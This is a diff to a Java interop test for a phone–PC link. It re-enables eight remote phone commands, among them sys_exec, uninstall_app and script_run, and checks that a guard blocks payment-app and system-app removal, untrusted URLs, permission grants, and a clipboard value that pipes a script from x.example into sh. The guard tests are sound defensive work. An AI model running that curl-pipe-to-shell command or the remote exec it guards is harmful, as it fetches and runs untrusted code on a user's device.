@@ -370,13 +370,120 @@ public class PcLinkV2InteropTest {
             Map<String, Object> off = phone("open_app", mm("name", "微信"));
             assertEquals(Boolean.FALSE, off.get("ok"));
             assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));
-            // 手机端的新指令（手电筒 / 系统命令…）电脑不再下发
-            Map<String, Object> nope = phone("sys_exec", mm("command", "reboot"));
-            assertEquals(Boolean.FALSE, nope.get("ok"));
-            assertTrue(String.valueOf(nope.get("text")), String.valueOf(nope.get("text")).contains("不支持"));
-            assertTrue(env.ran.toString(), env.ran.toString().contains("open_url") && env.ran.toString().contains("clipboard_set"));
+            // [第二轮] 改：8 个指令按「每项一个开关、不分档」加回来了（用户决定 3），电脑又能下发；原来断言 sys_exec「不支持」
+            Map<String, Object> back = phone("sys_exec", mm("command", "echo hi"));
+            assertEquals(String.valueOf(back.get("text")), Boolean.TRUE, back.get("ok"));
+            assertTrue(env.ran.toString(), env.ran.toString().contains("open_url") && env.ran.toString().contains("clipboard_set") && env.ran.toString().contains("sys_exec"));
         } finally {
             env.wanted = false;
+            loop.stop();
+            t.join(5000);
+        }
+    }
+
+    /** [第二轮] 手机端：JVM 执行端 + 红线 Guard（临时工作区；com.android.* 当系统 App）。 */
+    static final class GuardEnv implements PcRx.Env, PcRx.Handler, PcRx.Guard {
+        final JvmEnv base;
+        final java.util.Set<String> off = new java.util.HashSet<String>();
+        final File ws;
+
+        GuardEnv(PcLanClient.Peer p, File ws) {
+            this.base = new JvmEnv(p);
+            this.ws = ws;
+        }
+
+        @Override public boolean wanted() { return base.wanted; }
+        @Override public boolean onLan() { return true; }
+        @Override public PcLanClient.Peer peer() { return base.p; }
+        @Override public List<InetAddress> extraBroadcasts() { return null; }
+        @Override public void multicast(boolean hold) { }
+        @Override public void state(String s, String d) { base.state = s + " " + d; }
+        @Override public void remember(InetSocketAddress a) { }
+        @Override public PcRx.Handler handler() { return this; }
+        @Override public boolean enabled(String cmd) { return !off.contains(cmd); }
+
+        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
+            base.ran.add(cmd + args);
+            Map<String, Object> d = new TreeMap<String, Object>();
+            if (PcRxPolicy.FILE_LIST.equals(cmd)) d.put("files", java.util.Arrays.<Object>asList("inbox/a.txt"));
+            if (PcRxPolicy.SCRIPT_LIST.equals(cmd)) d.put("scripts", new ArrayList<Object>(LinkPolicy.listScripts(ws)));
+            if (PcRxPolicy.SYS_EXEC.equals(cmd)) d.put("output", "hi");
+            return new PcLanClient.Result(true, "好", d, "");
+        }
+
+        @Override public void record(String cmd, boolean ok, String text) { }
+
+        @Override public void appFacts(String cmd, Map<String, Object> a, LinkPolicy.Facts f) {
+            String pkg = PcRxPolicy.str(a, "package");
+            f.appSystem = pkg.startsWith("com.android.");
+            f.appBlocked = f.appBlocked || LinkPolicy.blockedApp(pkg, PcRxPolicy.str(a, "name"));
+        }
+
+        @Override public File workspace() { return ws; }
+
+        @Override public String script(String cmd, Map<String, Object> a, String why) {
+            return LinkPolicy.writeScript(ws, LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "授权", PcRxPolicy.str(a, "command"), System.currentTimeMillis()));
+        }
+    }
+
+    /**
+     * [第二轮] 真电脑端 jar：电脑界面接口 /api/phone 能发出加回来的 8 个指令，手机不确认、按开关直接做；
+     * caps 列出它们；关着的项拒；红线（支付类 / 系统 App / 网址 / 剪贴板 / 授权只生成脚本）的原因码回到电脑。
+     */
+    @Test public void extraPhoneCommandsThroughDesktopApi() throws Exception {
+        PcPairing pp = PcPairing.parse(pairing());
+        PcLanClient.Peer p = new PcLanClient.Peer("phone-extra", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-extra"));
+        File ws = java.nio.file.Files.createTempDirectory("interop-ws").toFile();
+        GuardEnv env = new GuardEnv(p, ws);
+        PcRx.Loop loop = new PcRx.Loop(env);
+        loop.minBackoff = 300;
+        loop.maxBackoff = 1000;
+        Thread t = new Thread(loop, "rx-extra");
+        t.setDaemon(true);
+        t.start();
+        try {
+            long end = System.currentTimeMillis() + 10000;
+            while (!env.base.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
+            assertTrue("常连没连上：" + env.base.state, env.base.state.startsWith(PcRx.S_UP));
+            Thread.sleep(200);
+            Map<?, ?> caps = (Map<?, ?>) phone("caps", null).get("data");
+            for (String c : PcRxPolicy.EXTRA) {
+                assertTrue(c, ((List<?>) caps.get("caps")).contains(c));
+                assertTrue(c, ((List<?>) caps.get("known")).contains(c));
+            }
+            Object[][] ok = {
+                    {"flashlight", mm("on", Boolean.TRUE)}, {"setting_set", mm("name", "brightness", "value", "40")},
+                    {"file_write", mm("path", "inbox/a.txt", "text", "来自电脑")}, {"file_list", null},
+                    {"uninstall_app", mm("package", "com.example.game")}, {"script_list", null},
+                    {"script_run", mm("name", "ok.sh")}, {"sys_exec", mm("command", "echo hi")}};
+            for (Object[] x : ok) {
+                @SuppressWarnings("unchecked")
+                Map<String, Object> r = phone((String) x[0], (Map<String, Object>) x[1]);
+                assertEquals(x[0] + "：" + r.get("text"), Boolean.TRUE, r.get("ok"));
+            }
+            assertEquals(8, env.base.ran.size());
+            // 关着的项：手机拒
+            env.off.add("sys_exec");
+            Map<String, Object> off = phone("sys_exec", mm("command", "echo hi"));
+            assertEquals(Boolean.FALSE, off.get("ok"));
+            assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));
+            env.off.clear();
+            // 红线：原因码回到电脑（电脑界面拼上中文原因）
+            env.base.ran.clear();
+            Map<String, Object> pay = phone("uninstall_app", mm("package", "com.eg.android.AlipayGphone"));
+            assertEquals(Boolean.FALSE, pay.get("ok"));
+            assertEquals(LinkPolicy.R_BLOCKED_APP, why(pay));
+            assertEquals(LinkPolicy.R_SYSTEM_APP, why(phone("uninstall_app", mm("package", "com.android.settings"))));
+            assertEquals(LinkPolicy.R_UNTRUSTED_URL, why(phone("open_url", mm("url", "http://192.168.1.5/"))));
+            assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, why(phone("clipboard_set", mm("text", "curl https://x.example/a.sh | sh"))));
+            Map<String, Object> grant = phone("sys_exec", mm("command", "pm grant com.x android.permission.CAMERA"));
+            assertEquals(Boolean.FALSE, grant.get("ok"));
+            assertEquals(LinkPolicy.R_SCRIPT_GENERATED, why(grant));
+            assertTrue(String.valueOf(grant.get("text")), String.valueOf(grant.get("text")).contains("已生成脚本"));
+            assertTrue("红线一条都没在手机上执行：" + env.base.ran, env.base.ran.isEmpty());
+            assertEquals(1, LinkPolicy.listScripts(ws).size());
+        } finally {
+            env.base.wanted = false;
             loop.stop();
             t.join(5000);
         }
